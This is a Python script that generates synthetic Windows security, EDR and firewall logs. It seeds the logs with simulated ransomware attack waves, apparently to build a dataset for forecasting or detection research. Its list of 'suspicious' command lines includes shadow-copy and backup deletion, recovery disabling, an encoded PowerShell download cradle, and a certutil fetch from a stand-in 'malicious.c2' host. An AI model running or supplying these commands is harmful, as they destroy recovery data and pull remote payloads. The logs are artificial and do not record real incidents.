"""
Realistic Synthetic SIEM / EDR / Network Log Generator for Ransomware Attack Wave Forecasting.
Generates multi-source security telemetry with Poisson background noise and clustered
ransomware attack cascades across training and test temporal splits.
"""

import json
import csv
import os
import random
from datetime import datetime, timedelta
from typing import List, Dict, Any

def generate_siem_dataset(
    output_dir: str = "data/raw",
    duration_days: int = 16,
    start_date: str = "2026-10-01T00:00:00Z",
    random_seed: int = 42
) -> Dict[str, str]:
    """
    Generates realistic SIEM telemetry files in output_dir:
    - windows_security.json: Windows Event IDs (4624, 4625, 4688, 7045)
    - edr_telemetry.json: EDR process and high-entropy file writes
    - firewall_traffic.csv: SMB (445) and RDP (3389) connection events
    """
    os.makedirs(output_dir, exist_ok=True)
    random.seed(random_seed)
    
    start_dt = datetime.fromisoformat(start_date.replace("Z", "+00:00"))
    total_seconds = int(duration_days * 86400)
    
    # 16 days = 384 hours.
    # 80% train = hours 0 to 307.2 (Waves at 72h, 168h, 240h)
    # 20% test = hours 307.2 to 384h (Waves at 330h, 360h)
    wave_hours = [72.0, 168.0, 240.0, 330.0, 360.0]
    
    windows_events: List[Dict[str, Any]] = []
    edr_events: List[Dict[str, Any]] = []
    firewall_events: List[Dict[str, Any]] = []
    
    # 1. Background Noise Generation
    # Failed logons (4625) ~ 2 per hour
    num_bg_logons = int(duration_days * 24 * 2.0)
    for _ in range(num_bg_logons):
        offset = random.uniform(0, total_seconds)
        ts = start_dt + timedelta(seconds=offset)
        ip = f"192.168.1.{random.randint(10, 200)}"
        windows_events.append({
            "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4625,
            "Channel": "Security",
            "TargetUserName": random.choice(["guest", "admin", "service_account", "john", "scanner"]),
            "IpAddress": ip,
            "FailureReason": "Unknown user name or bad password",
            "WorkstationName": "WORKSTATION-" + str(random.randint(1, 20))
        })
        
    # Normal logons (4624) ~ 4 per hour
    num_bg_4624 = int(duration_days * 24 * 4.0)
    for _ in range(num_bg_4624):
        offset = random.uniform(0, total_seconds)
        ts = start_dt + timedelta(seconds=offset)
        windows_events.append({
            "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4624,
            "Channel": "Security",
            "TargetUserName": random.choice(["alice", "bob", "carol", "dave"]),
            "IpAddress": f"192.168.1.{random.randint(10, 50)}",
            "LogonType": random.choice([2, 3, 10]),
            "WorkstationName": "WORKSTATION-" + str(random.randint(1, 20))
        })

    # Benign process creations (4688) ~ 3 per hour
    benign_cmds = [
        "svchost.exe -k netsvcs",
        "cmd.exe /c echo heartbeat",
        "chrome.exe --type=renderer",
        "notepad.exe notes.txt",
        "git.exe status"
    ]
    num_bg_4688 = int(duration_days * 24 * 3.0)
    for _ in range(num_bg_4688):
        offset = random.uniform(0, total_seconds)
        ts = start_dt + timedelta(seconds=offset)
        windows_events.append({
            "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "EventID": 4688,
            "Channel": "Security",
            "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
            "CommandLine": random.choice(benign_cmds),
            "SubjectUserName": "SYSTEM",
            "IpAddress": f"192.168.1.{random.randint(10, 50)}"
        })

    # Benign firewall traffic ~ 3 per hour
    num_bg_fw = int(duration_days * 24 * 3.0)
    for _ in range(num_bg_fw):
        offset = random.uniform(0, total_seconds)
        ts = start_dt + timedelta(seconds=offset)
        firewall_events.append({
            "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
            "src_ip": f"192.168.1.{random.randint(10, 50)}",
            "dest_ip": f"192.168.1.{random.randint(51, 100)}",
            "dest_port": random.choice([80, 443, 8080, 53]),
            "action": "ALLOW",
            "bytes_transferred": random.randint(100, 15000)
        })

    # 2. Ransomware Attack Waves (Self-Exciting Cascades)
    suspicious_commands = [
        "vssadmin.exe delete shadows /all /quiet",
        "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        "bcdedit.exe /set {default} recoveryenabled no",
        "wbadmin.exe delete catalog -quiet",
        "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA=",
        "certutil.exe -urlcache -split -f http://malicious.c2/payload.bin payload.exe"
    ]

    for wave_idx, w_hour in enumerate(wave_hours):
        wave_base_sec = w_hour * 3600.0
        attacker_ip = f"10.0.5.{100 + wave_idx}"
        target_subnet = f"192.168.1."
        
        # Phase A: Initial Access / Brute Force (0 to 1.5h into wave)
        # Cluster of 75-100 failed logons within ~1.5 hours
        num_burst_failed = random.randint(75, 100)
        for _ in range(num_burst_failed):
            burst_offset = wave_base_sec + random.uniform(0, 4500)
            ts = start_dt + timedelta(seconds=burst_offset)
            windows_events.append({
                "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "EventID": 4625,
                "Channel": "Security",
                "TargetUserName": "administrator",
                "IpAddress": attacker_ip,
                "FailureReason": "Account locked out or invalid password",
                "WorkstationName": f"DC-SERVER-{wave_idx+1}"
            })

        # Phase B: Lateral Movement (1.2h to 2.8h into wave)
        # SMB (445) and RDP (3389) bursts
        num_lateral = random.randint(60, 90)
        for _ in range(num_lateral):
            lat_sec = wave_base_sec + random.uniform(4320, 10080)
            ts = start_dt + timedelta(seconds=lat_sec)
            firewall_events.append({
                "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "src_ip": attacker_ip,
                "dest_ip": f"{target_subnet}{random.randint(10, 60)}",
                "dest_port": random.choice([445, 3389]),
                "action": "ALLOW",
                "bytes_transferred": random.randint(50000, 2000000)
            })

        # Phase C: Privilege Escalation & Recovery Inhibition (2.5h to 3.5h into wave)
        num_cmds = random.randint(30, 45)
        for _ in range(num_cmds):
            cmd_sec = wave_base_sec + random.uniform(9000, 12600)
            ts = start_dt + timedelta(seconds=cmd_sec)
            windows_events.append({
                "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "EventID": 4688,
                "Channel": "Security",
                "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
                "CommandLine": random.choice(suspicious_commands),
                "SubjectUserName": "SYSTEM",
                "IpAddress": attacker_ip
            })
            if random.random() < 0.4:
                windows_events.append({
                    "TimeCreated": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                    "EventID": 7045,
                    "Channel": "System",
                    "ServiceName": f"MalwareDriverService_{random.randint(100, 999)}",
                    "ImagePath": "C:\\Windows\\Temp\\ransom_kernel.sys",
                    "ServiceType": "Kernel Driver",
                    "IpAddress": attacker_ip
                })

        # Phase D: Mass Encryption Burst (PEAK at ~3.5h to 4.5h into wave)
        num_enc = random.randint(120, 160)
        for _ in range(num_enc):
            enc_sec = wave_base_sec + random.uniform(12600, 16200)
            ts = start_dt + timedelta(seconds=enc_sec)
            edr_events.append({
                "timestamp": ts.strftime("%Y-%m-%dT%H:%M:%SZ"),
                "event_type": "FILE_MODIFICATION",
                "source_ip": attacker_ip,
                "target_host": f"HOST-{random.randint(1, 30)}",
                "process_name": "encryptor.exe",
                "file_path": f"C:\\Shares\\Accounting\\doc_{random.randint(1000, 9999)}.locked",
                "entropy_score": round(random.uniform(7.8, 8.0), 3),
                "action": "ENCRYPT_WRITE"
            })

    # Sort each stream by timestamp
    windows_events.sort(key=lambda x: x["TimeCreated"])
    firewall_events.sort(key=lambda x: x["timestamp"])
    edr_events.sort(key=lambda x: x["timestamp"])

    # Write files
    win_path = os.path.join(output_dir, "windows_security.json")
    with open(win_path, "w", encoding="utf-8") as f:
        json.dump(windows_events, f, indent=2)

    edr_path = os.path.join(output_dir, "edr_telemetry.json")
    with open(edr_path, "w", encoding="utf-8") as f:
        json.dump(edr_events, f, indent=2)

    fw_path = os.path.join(output_dir, "firewall_traffic.csv")
    with open(fw_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=["timestamp", "src_ip", "dest_ip", "dest_port", "action", "bytes_transferred"])
        writer.writeheader()
        writer.writerows(firewall_events)

    return {
        "windows_security": win_path,
        "edr_telemetry": edr_path,
        "firewall_traffic": fw_path
    }

if __name__ == "__main__":
    generated = generate_siem_dataset()
    print("Generated 16-day SIEM datasets successfully.")
